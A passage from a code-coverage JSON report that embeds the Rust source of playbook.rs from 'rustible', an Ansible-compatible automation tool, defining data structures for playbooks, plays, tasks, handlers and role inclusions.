381,49028620,49028208,49023782],"length":1,"stats":{"Line":3}},{"line":906,"address":[49022428],"length":1,"stats":{"Line":1}},{"line":907,"address":[49023132],"length":1,"stats":{"Line":1}},{"line":912,"address":[49039654,49039739],"length":1,"stats":{"Line":0}},{"line":917,"address":[49040286,49040224],"length":1,"stats":{"Line":0}},{"line":922,"address":[49040191],"length":1,"stats":{"Line":0}},{"line":924,"address":[49040043,49040369,49040116,49039897],"length":1,"stats":{"Line":0}},{"line":926,"address":[49040072],"length":1,"stats":{"Line":0}},{"line":927,"address":[49040108,49040510,49039685],"length":1,"stats":{"Line":0}},{"line":933,"address":[49058180,49058036],"length":1,"stats":{"Line":0}},{"line":935,"address":[49058302,49058240],"length":1,"stats":{"Line":0}},{"line":937,"address":[49058498],"length":1,"stats":{"Line":0}},{"line":938,"address":[49058267,49058415],"length":1,"stats":{"Line":0}},{"line":944,"address":[49058088],"length":1,"stats":{"Line":0}},{"line":945,"address":[49057701,49058124,49058526],"length":1,"stats":{"Line":0}},{"line":948,"address":[49056422,49056502],"length":1,"stats":{"Line":0}},{"line":951,"address":[49056532,49056767,49056643],"length":1,"stats":{"Line":0}},{"line":956,"address":[49057440],"length":1,"stats":{"Line":0}},{"line":962,"address":[49057114],"length":1,"stats":{"Line":0}},{"line":969,"address":[49110115,49114176,49106656],"length":1,"stats":{"Line":1}},{"line":970,"address":[],"length":0,"stats":{"Line":0}},{"line":971,"address":[49106702,49106842],"length":1,"stats":{"Line":2}},{"line":973,"address":[49106880],"length":1,"stats":{"Line":1}},{"line":974,"address":[],"length":0,"stats":{"Line":0}},{"line":976,"address":[49106990,49106914],"length":1,"stats":{"Line":2}},{"line":981,"address":[49107119,49108922,49107230,49107354],"length":1,"stats":{"Line":4}},{"line":985,"address":[49108653,49107777,49107611],"length":1,"stats":{"Line":2}},{"line":986,"address":[49107912],"length":1,"stats":{"Line":0}},{"line":987,"address":[49108380],"length":1,"stats":{"Line":0}},{"line":988,"address":[49108524],"length":1,"stats":{"Line":0}},{"line":989,"address":[49108578],"length":1,"stats":{"Line":0}},{"line":993,"address":[49108869,49108975],"length":1,"stats":{"Line":2}},{"line":994,"address":[49109839,49109144],"length":1,"stats":{"Line":2}},{"line":1008,"address":[49107640,49110128,49110945],"length":1,"stats":{"Line":3}},{"line":1009,"address":[49110228],"length":1,"stats":{"Line":1}},{"line":1010,"address":[49110684],"length":1,"stats":{"Line":1}},{"line":1014,"address":[49110134],"length":1,"stats":{"Line":1}},{"line":1015,"address":[49110950,49111074,49110142],"length":1,"stats":{"Line":3}},{"line":1016,"address":[49111246,49111153],"length":1,"stats":{"Line":2}},{"line":1020,"address":[],"length":0,"stats":{"Line":0}},{"line":1021,"address":[49111176,49111030,49111454],"length":1,"stats":{"Line":2}},{"line":1022,"address":[],"length":0,"stats":{"Line":0}},{"line":1028,"address":[49111929,49111572],"length":1,"stats":{"Line":0}},{"line":1032,"address":[49113221,49112642],"length":1,"stats":{"Line":2}},{"line":1036,"address":[],"length":0,"stats":{"Line":0}},{"line":1037,"address":[49112668,49113173,49112519,49113429],"length":1,"stats":{"Line":2}},{"line":1045,"address":[49113784,49107189,49106935,49114088,49113063,49107054,49106787,49114197],"length":1,"stats":{"Line":1}},{"line":1056,"address":[49014730,49015712],"length":1,"stats":{"Line":0}},{"line":1057,"address":[49014814,49015983],"length":1,"stats":{"Line":0}},{"line":1058,"address":[49015225,49016676],"length":1,"stats":{"Line":0}},{"line":1059,"address":[49015065,49016291],"length":1,"stats":{"Line":2}},{"line":1062,"address":[49014983,49016259],"length":1,"stats":{"Line":0}},{"line":1067,"address":[49017196,49015471],"length":1,"stats":{"Line":2}},{"line":1068,"address":[49016708,49015307],"length":1,"stats":{"Line":0}},{"line":1078,"address":[49101888,49104031,49104037],"length":1,"stats":{"Line":1}},{"line":1079,"address":[49101927],"length":1,"stats":{"Line":1}},{"line":1080,"address":[49102071],"length":1,"stats":{"Line":1}},{"line":1082,"address":[49101999,49104064],"length":1,"stats":{"Line":0}},{"line":1083,"address":[49104087],"length":1,"stats":{"Line":0}},{"line":1085,"address":[49104176],"length":1,"stats":{"Line":0}},{"line":1091,"address":[49104230],"length":1,"stats":{"Line":0}},{"line":1092,"address":[49104797],"length":1,"stats":{"Line":0}},{"line":1094,"address":[49104932],"length":1,"stats":{"Line":0}},{"line":1096,"address":[49105121],"length":1,"stats":{"Line":0}},{"line":1097,"address":[49105148],"length":1,"stats":{"Line":0}},{"line":1098,"address":[49105175],"length":1,"stats":{"Line":0}},{"line":1099,"address":[49104824],"length":1,"stats":{"Line":0}},{"line":1100,"address":[49104851],"length":1,"stats":{"Line":0}},{"line":1101,"address":[49104986],"length":1,"stats":{"Line":0}},{"line":1103,"address":[49104689],"length":1,"stats":{"Line":0}},{"line":1105,"address":[49104770],"length":1,"stats":{"Line":0}},{"line":1110,"address":[49105067],"length":1,"stats":{"Line":0}},{"line":1111,"address":[49105094],"length":1,"stats":{"Line":0}},{"line":1115,"address":[49104284],"length":1,"stats":{"Line":0}},{"line":1116,"address":[49104311],"length":1,"stats":{"Line":0}},{"line":1121,"address":[49104446],"length":1,"stats":{"Line":0}},{"line":1122,"address":[49104500],"length":1,"stats":{"Line":0}},{"line":1123,"address":[49104473],"length":1,"stats":{"Line":0}},{"line":1124,"address":[49104527],"length":1,"stats":{"Line":0}},{"line":1125,"address":[49104554],"length":1,"stats":{"Line":0}},{"line":1126,"address":[49104581],"length":1,"stats":{"Line":0}},{"line":1127,"address":[49104608],"length":1,"stats":{"Line":0}},{"line":1128,"address":[49104635],"length":1,"stats":{"Line":0}},{"line":1129,"address":[49105283],"length":1,"stats":{"Line":0}},{"line":1131,"address":[49105499],"length":1,"stats":{"Line":0}},{"line":1134,"address":[49105445],"length":1,"stats":{"Line":0}},{"line":1135,"address":[49105364],"length":1,"stats":{"Line":0}},{"line":1136,"address":[49105391],"length":1,"stats":{"Line":0}},{"line":1138,"address":[49105310],"length":1,"stats":{"Line":0}},{"line":1141,"address":[49105337],"length":1,"stats":{"Line":0}},{"line":1143,"address":[49106120],"length":1,"stats":{"Line":0}},{"line":1145,"address":[49106471],"length":1,"stats":{"Line":0}},{"line":1149,"address":[49106522],"length":1,"stats":{"Line":0}},{"line":1151,"address":[49106336],"length":1,"stats":{"Line":0}},{"line":1156,"address":[49105634],"length":1,"stats":{"Line":0}},{"line":1160,"address":[49106444],"length":1,"stats":{"Line":0}},{"line":1163,"address":[49105796],"length":1,"stats":{"Line":0}},{"line":1164,"address":[49105823],"length":1,"stats":{"Line":0}},{"line":1166,"address":[49106282],"length":1,"stats":{"Line":0}},{"line":1173,"address":[49106201],"length":1,"stats":{"Line":0}},{"line":1174,"address":[49106174],"length":1,"stats":{"Line":0}},{"line":1180,"address":[49105904],"length":1,"stats":{"Line":0}},{"line":1184,"address":[49105958],"length":1,"stats":{"Line":0}},{"line":1185,"address":[49106147],"length":1,"stats":{"Line":0}},{"line":1186,"address":[49104149],"length":1,"stats":{"Line":0}}],"covered":95,"coverable":458},{"path":["/","home","artur","Repositories","rustible","src","parser","playbook.rs"],"content":"//! Playbook structure definitions for Rustible.\n//!\n//! This module defines the data structures for Ansible-compatible playbooks,\n//! including plays, tasks, handlers, and role inclusions.\n\nuse indexmap::IndexMap;\nuse serde::{Deserialize, Serialize};\nuse std::path::PathBuf;\n\n/// A complete playbook containing multiple plays\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Playbook {\n    /// Ordered list of plays\n    pub plays: Vec\u003cPlay\u003e,\n\n    /// Source file path\n    #[serde(skip)]\n    pub source_path: Option\u003cPathBuf\u003e,\n}\n\nimpl Playbook {\n    /// Create a new empty playbook\n    pub fn new() -\u003e Self {\n        Self {\n            plays: Vec::new(),\n            source_path: None,\n        }\n    }\n\n    /// Create a playbook with a source path\n    pub fn with_source(source: PathBuf) -\u003e Self {\n        Self {\n            plays: Vec::new(),\n            source_path: Some(source),\n        }\n    }\n\n    /// Add a play to the playbook\n    pub fn add_play(\u0026mut self, play: Play) {\n        self.plays.push(play);\n    }\n\n    /// Get the number of plays\n    pub fn play_count(\u0026self) -\u003e usize {\n        self.plays.len()\n    }\n\n    /// Get total number of tasks across all plays\n    pub fn task_count(\u0026self) -\u003e usize {\n        self.plays.iter().map(|p| p.tasks.len()).sum()\n    }\n}\n\nimpl Default for Playbook {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n/// A play targeting a set of hosts with a list of tasks\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Play {\n    /// Play name/description\n    #[serde(default)]\n    pub name: String,\n\n    /// Host pattern to target\n    pub hosts: String,\n\n    /// Gather facts before running tasks\n    #[serde(default = \"default_gather_facts\")]\n    pub gather_facts: bool,\n\n    /// Gather facts subset\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub gather_subset: Option\u003cVec\u003cString\u003e\u003e,\n\n    /// Gather facts timeout\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub gather_timeout: Option\u003cu32\u003e,\n\n    /// Remote user for SSH\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub remote_user: Option\u003cString\u003e,\n\n    /// Enable privilege escalation\n    #[serde(default)]\n    pub r#become: bool,\n\n    /// Privilege escalation method\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub become_method: Option\u003cString\u003e,\n\n    /// User to become\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub become_user: Option\u003cString\u003e,\n\n    /// Connection type\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub connection: Option\u003cString\u003e,\n\n    /// Environment variables for all tasks\n    #[serde(default)]\n    pub environment: IndexMap\u003cString, String\u003e,\n\n    /// Play-level variables\n    #[serde(default)]\n    pub vars: IndexMap\u003cString, serde_yaml::Value\u003e,\n\n    /// Variable files to include\n    #[serde(default)]\n    pub vars_files: Vec\u003cString\u003e,\n\n    /// Variable prompts\n    #[serde(default)]\n    pub vars_prompt: Vec\u003cVarsPrompt\u003e,\n\n    /// Pre-tasks (run before roles)\n    #[serde(default)]\n    pub pre_tasks: Vec\u003cTask\u003e,\n\n    /// Roles to include\n    #[serde(default)]\n    pub roles: Vec\u003cRoleInclusion\u003e,\n\n    /// Main tasks\n    #[serde(default)]\n    pub tasks: Vec\u003cTask\u003e,\n\n    /// Post-tasks (run after roles and tasks)\n    #[serde(default)]\n    pub post_tasks: Vec\u003cTask\u003e,\n\n    /// Handlers\n    #[serde(default)]\n    pub handlers: Vec\u003cHandler\u003e,\n\n    /// Maximum concurrent hosts\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub serial: Option\u003cSerialSpec\u003e,\n\n    /// Maximum failure percentage before aborting\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub max_fail_percentage: Option\u003cf32\u003e,\n\n    /// Continue on errors\n    #[serde(default)]\n    pub ignore_errors: bool,\n\n    /// Continue on unreachable hosts\n    #[serde(default)]\n    pub ignore_unreachable: bool,\n\n    /// Module defaults\n    #[serde(default)]\n    pub module_defaults: IndexMap\u003cString, IndexMap\u003cString, serde_yaml::Value\u003e\u003e,\n\n    /// Play tags\n    #[serde(default)]\n    pub tags: Vec\u003cString\u003e,\n\n    /// Strategy (linear, free, debug)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub strategy: Option\u003cString\u003e,\n\n    /// Throttle (limit concurrent tasks per host)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub throttle: Option\u003cu32\u003e,\n\n    /// Order of host execution\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub order: Option\u003cPlayOrder\u003e,\n\n    /// Force all handlers to run at end of play\n    #[serde(default)]\n    pub force_handlers: bool,\n\n    /// Run once on first host only\n    #[serde(default)]\n    pub run_once: bool,\n\n    /// Conditional execution\n    #[serde(default, rename = \"when\")]\n    pub when_condition: Vec\u003cString\u003e,\n\n    /// Become password (should be from vault/prompt)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub become_password: Option\u003cString\u003e,\n\n    /// Any host is ok (don't fail if some hosts unreachable)\n    #[serde(default)]\n    pub any_errors_fatal: bool,\n}\n\nfn default_gather_facts() -\u003e bool {\n    true\n}\n\nimpl Play {\n    /// Create a new play targeting the specified hosts\n    pub fn new(hosts: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: String::new(),\n            hosts: hosts.into(),\n            gather_facts: true,\n            gather_subset: None,\n            gather_timeout: None,\n            remote_user: None,\n            r#become: false,\n            become_method: None,\n            become_user: None,\n            connection: None,\n            environment: IndexMap::new(),\n            vars: IndexMap::new(),\n            vars_files: Vec::new(),\n            vars_prompt: Vec::new(),\n            pre_tasks: Vec::new(),\n            roles: Vec::new(),\n            tasks: Vec::new(),\n            post_tasks: Vec::new(),\n            handlers: Vec::new(),\n            serial: None,\n            max_fail_percentage: None,\n            ignore_errors: false,\n            ignore_unreachable: false,\n            module_defaults: IndexMap::new(),\n            tags: Vec::new(),\n            strategy: None,\n            throttle: None,\n            order: None,\n            force_handlers: false,\n            run_once: false,\n            when_condition: Vec::new(),\n            become_password: None,\n            any_errors_fatal: false,\n        }\n    }\n\n    /// Set the play name\n    pub fn with_name(mut self, name: impl Into\u003cString\u003e) -\u003e Self {\n        self.name = name.into();\n        self\n    }\n\n    /// Add a task to the play\n    pub fn add_task(\u0026mut self, task: Task) {\n        self.tasks.push(task);\n    }\n\n    /// Add a handler to the play\n    pub fn add_handler(\u0026mut self, handler: Handler) {\n        self.handlers.push(handler);\n    }\n\n    /// Add a role to the play\n    pub fn add_role(\u0026mut self, role: RoleInclusion) {\n        self.roles.push(role);\n    }\n\n    /// Set a variable\n    pub fn set_var(\u0026mut self, key: impl Into\u003cString\u003e, value: serde_yaml::Value) {\n        self.vars.insert(key.into(), value);\n    }\n\n    /// Get all tasks including pre_tasks, role tasks, tasks, and post_tasks\n    pub fn all_tasks(\u0026self) -\u003e impl Iterator\u003cItem = \u0026Task\u003e {\n        self.pre_tasks\n            .iter()\n            .chain(self.tasks.iter())\n            .chain(self.post_tasks.iter())\n    }\n}\n\nimpl Default for Play {\n    fn default() -\u003e Self {\n        Self::new(\"all\")\n    }\n}\n\n/// Serial execution specification\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum SerialSpec {\n    /// Fixed number of hosts\n    Count(u32),\n    /// Percentage of hosts\n    Percentage(String),\n    /// List of batch sizes\n    Batches(Vec\u003cSerialBatch\u003e),\n}\n\n/// A single batch in serial execution\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum SerialBatch {\n    Count(u32),\n    Percentage(String),\n}\n\n/// Host execution order\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(rename_all = \"lowercase\")]\npub enum PlayOrder {\n    /// Default inventory order\n    Inventory,\n    /// Reverse inventory order\n    Reverse,\n    /// Sorted alphabetically\n    Sorted,\n    /// Reverse sorted\n    ReverseSorted,\n    /// Random order\n    Shuffle,\n}\n\n/// Variable prompt definition\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct VarsPrompt {\n    /// Variable name\n    pub name: String,\n\n    /// Prompt message\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub prompt: Option\u003cString\u003e,\n\n    /// Default value\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub default: Option\u003cString\u003e,\n\n    /// Hide input (for passwords)\n    #[serde(default)]\n    pub private: bool,\n\n    /// Confirm input\n    #[serde(default)]\n    pub confirm: bool,\n\n    /// Encrypt with hash algorithm\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub encrypt: Option\u003cString\u003e,\n\n    /// Salt size for encryption\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub salt_size: Option\u003cu32\u003e,\n}\n\n/// A task definition\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Task {\n    /// Task name\n    #[serde(default)]\n    pub name: String,\n\n    /// The module to execute (action)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub action: Option\u003cModuleCall\u003e,\n\n    /// Short module syntax (module_name: args)\n    #[serde(flatten)]\n    pub module: IndexMap\u003cString, serde_yaml::Value\u003e,\n\n    /// Conditional execution\n    #[serde(default, rename = \"when\")]\n    pub when_condition: Vec\u003cString\u003e,\n\n    /// Loop over items\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub loop_over: Option\u003cLoopSpec\u003e,\n\n    /// Legacy with_* loops\n    #[serde(flatten)]\n    pub with_loops: IndexMap\u003cString, serde_yaml::Value\u003e,\n\n    /// Loop control options\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub loop_control: Option\u003cLoopControl\u003e,\n\n    /// Register result in variable\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub register: Option\u003cString\u003e,\n\n    /// Handlers to notify on change\n    #[serde(default)]\n    pub notify: Vec\u003cString\u003e,\n\n    /// Ignore errors\n    #[serde(default)]\n    pub ignore_errors: bool,\n\n    /// Ignore unreachable hosts\n    #[serde(default)]\n    pub ignore_unreachable: bool,\n\n    /// Changed when condition\n    #[serde(default)]\n    pub changed_when: Vec\u003cString\u003e,\n\n    /// Failed when condition\n    #[serde(default)]\n    pub failed_when: Vec\u003cString\u003e,\n\n    /// Task tags\n    #[serde(default)]\n    pub tags: Vec\u003cString\u003e,\n\n    /// Become (privilege escalation)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub r#become: Option\u003cbool\u003e,\n\n    /// Become method\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub become_method: Option\u003cString\u003e,\n\n    /// Become user\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub become_user: Option\u003cString\u003e,\n\n    /// Delegate to another host\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub delegate_to: Option\u003cString\u003e,\n\n    /// Delegate facts\n    #[serde(default)]\n    pub delegate_facts: bool,\n\n    /// Local action\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub local_action: Option\u003cModuleCall\u003e,\n\n    /// Run once (only on first host)\n    #[serde(default)]\n    pub run_once: bool,\n\n    /// Retry count\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub retries: Option\u003cu32\u003e,\n\n    /// Delay between retries\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub delay: Option\u003cu32\u003e,\n\n    /// Until condition for retries\n    #[serde(default)]\n    pub until: Vec\u003cString\u003e,\n\n    /// Async execution timeout\n    #[serde(skip_serializing_if = \"Option::is_none\", rename = \"async\")]\n    pub async_timeout: Option\u003cu32\u003e,\n\n    /// Polling interval for async\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub poll: Option\u003cu32\u003e,\n\n    /// Environment variables\n    #[serde(default)]\n    pub environment: IndexMap\u003cString, String\u003e,\n\n    /// Task-level variables\n    #[serde(default)]\n    pub vars: IndexMap\u003cString, serde_yaml::Value\u003e,\n\n    /// Args for the module\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub args: Option\u003cIndexMap\u003cString, serde_yaml::Value\u003e\u003e,\n\n    /// Block of tasks (for block/rescue/always)\n    #[serde(default)]\n    pub block: Vec\u003cTask\u003e,\n\n    /// Rescue tasks (run on block failure)\n    #[serde(default)]\n    pub rescue: Vec\u003cTask\u003e,\n\n    /// Always tasks (always run after block)\n    #[serde(default)]\n    pub always: Vec\u003cTask\u003e,\n\n    /// Connection type\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub connection: Option\u003cString\u003e,\n\n    /// Throttle (limit concurrent executions)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub throttle: Option\u003cu32\u003e,\n\n    /// Timeout for task execution\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub timeout: Option\u003cu32\u003e,\n\n    /// No log (hide output for sensitive data)\n    #[serde(default)]\n    pub no_log: bool,\n\n    /// Diff mode\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub diff: Option\u003cbool\u003e,\n\n    /// Check mode\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub check_mode: Option\u003cbool\u003e,\n\n    /// Module defaults group\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub module_defaults: Option\u003cString\u003e,\n\n    /// Any errors are fatal\n    #[serde(default)]\n    pub any_errors_fatal: bool,\n}\n\nimpl Task {\n    /// Create a new task with a name\n    pub fn new(name: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            action: None,\n            module: IndexMap::new(),\n            when_condition: Vec::new(),\n            loop_over: None,\n            with_loops: IndexMap::new(),\n            loop_control: None,\n            register: None,\n            notify: Vec::new(),\n            ignore_errors: false,\n            ignore_unreachable: false,\n            changed_when: Vec::new(),\n            failed_when: Vec::new(),\n            tags: Vec::new(),\n            r#become: None,\n            become_method: None,\n            become_user: None,\n            delegate_to: None,\n            delegate_facts: false,\n            local_action: None,\n            run_once: false,\n            retries: None,\n            delay: None,\n            until: Vec::new(),\n            async_timeout: None,\n            poll: None,\n            environment: IndexMap::new(),\n            vars: IndexMap::new(),\n            args: None,\n            block: Vec::new(),\n            rescue: Vec::new(),\n            always: Vec::new(),\n            connection: None,\n            throttle: None,\n            timeout: None,\n            no_log: false,\n            diff: None,\n            check_mode: None,\n            module_defaults: None,\n            any_errors_fatal: false,\n        }\n    }\n\n    /// Create a task with a module call\n    pub fn with_module(\n        name: impl Into\u003cString\u003e,\n        module: impl Into\u003cString\u003e,\n        args: serde_yaml::Value,\n    ) -\u003e Self {\n        let mut task = Self::new(name);\n        task.module.insert(module.into(), args);\n        task\n    }\n\n    /// Check if this is a block task\n    pub fn is_block(\u0026self) -\u003e bool {\n        !self.block.is_empty()\n    }\n\n    /// Get the module name being called\n    pub fn get_module_name(\u0026self) -\u003e Option\u003c\u0026str\u003e {\n        // Check action first\n        if let Some(action) = \u0026self.action {\n            return Some(\u0026action.module);\n        }\n\n        // Check local_action\n        if let Some(local) = \u0026self.local_action {\n            return Some(\u0026local.module);\n        }\n\n        // Check module shorthand (skip known non-module keys)\n        let non_module_keys = [\n            \"name\",\n            \"when\",\n            \"loop\",\n            \"register\",\n            \"notify\",\n            \"ignore_errors\",\n            \"ignore_unreachable\",\n            \"changed_when\",\n            \"failed_when\",\n            \"tags\",\n            \"become\",\n            \"become_method\",\n            \"become_user\",\n            \"delegate_to\",\n            \"delegate_facts\",\n            \"run_once\",\n            \"retries\",\n            \"delay\",\n            \"until\",\n            \"async\",\n            \"poll\",\n            \"environment\",\n            \"vars\",\n            \"args\",\n            \"block\",\n            \"rescue\",\n            \"always\",\n            \"connection\",\n            \"throttle\",\n            \"timeout\",\n            \"no_log\",\n            \"diff\",\n            \"check_mode\",\n            \"module_defaults\",\n            \"any_errors_fatal\",\n            \"loop_control\",\n        ];\n\n        for key in self.module.keys() {\n            if !non_module_keys.contains(\u0026key.as_str()) \u0026\u0026 !key.starts_with(\"with_\") {\n                return Some(key);\n            }\n        }\n\n        None\n    }\n\n    /// Get the module arguments\n    pub fn get_module_args(\u0026self) -\u003e Option\u003c\u0026serde_yaml::Value\u003e {\n        if let Some(action) = \u0026self.action {\n            return Some(\u0026action.args);\n        }\n\n        if let Some(local) = \u0026self.local_action {\n            return Some(\u0026local.args);\n        }\n\n        if let Some(module_name) = self.get_module_name() {\n            return self.module.get(module_name);\n        }\n\n        self.args.as_ref().map(|a| {\n            // Convert IndexMap to Value - this is a workaround\n            // In real code, we'd handle this differently\n            static EMPTY: serde_yaml::Value = serde_yaml::Value::Null;\n            \u0026EMPTY\n        })\n    }\n}\n\nimpl Default for Task {\n    fn default() -\u003e Self {\n        Self::new(\"\")\n    }\n}\n\n/// A module call specification\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct ModuleCall {\n    /// Module name\n    pub module: String,\n\n    /// Module arguments\n    #[serde(default)]\n    pub args: serde_yaml::Value,\n}\n\nimpl ModuleCall {\n    /// Create a new module call\n    pub fn new(module: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            module: module.into(),\n            args: serde_yaml::Value::Null,\n        }\n    }\n\n    /// Create a module call with arguments\n    pub fn with_args(module: impl Into\u003cString\u003e, args: serde_yaml::Value) -\u003e Self {\n        Self {\n            module: module.into(),\n            args,\n        }\n    }\n}\n\n/// Loop specification\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum LoopSpec {\n    /// Simple list\n    List(Vec\u003cserde_yaml::Value\u003e),\n    /// Expression (template string)\n    Expression(String),\n}\n\n/// Loop control options\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct LoopControl {\n    /// Variable name for current item\n    #[serde(default = \"default_loop_var\")]\n    pub loop_var: String,\n\n    /// Variable name for index\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub index_var: Option\u003cString\u003e,\n\n    /// Label for output\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub label: Option\u003cString\u003e,\n\n    /// Pause between iterations (seconds)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub pause: Option\u003cf32\u003e,\n\n    /// Extended loop information\n    #[serde(default)]\n    pub extended: bool,\n}\n\nfn default_loop_var() -\u003e String {\n    \"item\".to_string()\n}\n\nimpl Default for LoopControl {\n    fn default() -\u003e Self {\n        Self {\n            loop_var: default_loop_var(),\n            index_var: None,\n            label: None,\n            pause: None,\n            extended: false,\n        }\n    }\n}\n\n/// Handler definition (task triggered by notify)\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Handler {\n    /// Handler name (must match notify name)\n    pub name: String,\n\n    /// Handler is actually a task\n    #[serde(flatten)]\n    pub task: Task,\n\n    /// Listen to additional trigger names\n    #[serde(default)]\n    pub listen: Vec\u003cString\u003e,\n}\n\nimpl Handler {\n    /// Create a new handler\n    pub fn new(name: impl Into\u003cString\u003e) -\u003e Self {\n        let name = name.into();\n        Self {\n            name: name.clone(),\n            task: Task::new(\u0026name),\n            listen: Vec::new(),\n        }\n    }\n\n    /// Create a handler with a module call\n    pub fn with_module(\n        name: impl Into\u003cString\u003e,\n        module: impl Into\u003cString\u003e,\n        args: serde_yaml::Value,\n    ) -\u003e Self {\n        let name = name.into();\n        Self {\n            name: name.clone(),\n            task: Task::with_module(\u0026name, module, args),\n            listen: Vec::new(),\n        }\n    }\n\n    /// Check if this handler responds to a notification\n    pub fn responds_to(\u0026self, notification: \u0026str) -\u003e bool {\n        self.name == notification || self.listen.contains(\u0026notification.to_string())\n    }\n}\n\n/// Role inclusion in a play\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum RoleInclusion {\n    /// Simple role name\n    Name(String),\n    /// Role with parameters\n    Full(RoleSpec),\n}\n\nimpl RoleInclusion {\n    /// Get the role name\n    pub fn name(\u0026self) -\u003e \u0026str {\n        match self {\n            RoleInclusion::Name(name) =\u003e name,\n            RoleInclusion::Full(spec) =\u003e \u0026spec.role,\n        }\n    }\n\n    /// Get role variables\n    pub fn vars(\u0026self) -\u003e Option\u003c\u0026IndexMap\u003cString, serde_yaml::Value\u003e\u003e {\n        match self {\n            RoleInclusion::Name(_) =\u003e None,\n            RoleInclusion::Full(spec) =\u003e Some(\u0026spec.vars),\n        }\n    }\n}\n\n/// Full role specification\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct RoleSpec {\n    /// Role name or path\n    pub role: String,\n\n    /// Role variables\n    #[serde(default)]\n    pub vars: IndexMap\u003cString, serde_yaml::Value\u003e,\n\n    /// Tags for the role\n    #[serde(default)]\n    pub tags: Vec\u003cString\u003e,\n\n    /// Conditional execution\n    #[serde(default, rename = \"when\")]\n    pub when_condition: Vec\u003cString\u003e,\n\n    /// Become settings\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub r#become: Option\u003cbool\u003e,\n\n    /// Become user\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub become_user: Option\u003cString\u003e,\n\n    /// Delegate to\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub delegate_to: Option\u003cString\u003e,\n\n    /// Apply settings (for include_role/import_role)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub apply: Option\u003cTaskApply\u003e,\n\n    /// Public (expose vars)\n    #[serde(default)]\n    pub public: bool,\n\n    /// Allow duplicates\n    #[serde(default)]\n    pub allow_duplicates: bool,\n\n    /// Handlers from (use handlers from another role)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub handlers_from: Option\u003cString\u003e,\n\n    /// Tasks from (use tasks from another role)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub tasks_from: Option\u003cString\u003e,\n\n    /// Vars from (use vars from another role)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub vars_from: Option\u003cString\u003e,\n\n    /// Defaults from (use defaults from another role)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub defaults_from: Option\u003cString\u003e,\n}\n\nimpl RoleSpec {\n    /// Create a new role specification\n    pub fn new(role: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            role: role.into(),\n            vars: IndexMap::new(),\n            tags: Vec::new(),\n            when_condition: Vec::new(),\n            r#become: None,\n            become_user: None,\n            delegate_to: None,\n            apply: None,\n            public: false,\n            allow_duplicates: false,\n            handlers_from: None,\n            tasks_from: None,\n            vars_from: None,\n            defaults_from: None,\n        }\n    }\n\n    /// Set a variable\n    pub fn set_var(\u0026mut self, key: impl Into\u003cString\u003e, value: serde_yaml::Value) {\n        self.vars.insert(key.into(), value);\n    }\n}\n\n/// Apply settings for dynamic includes\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TaskApply {\n    /// Tags to apply\n    #[serde(default)]\n    pub tags: 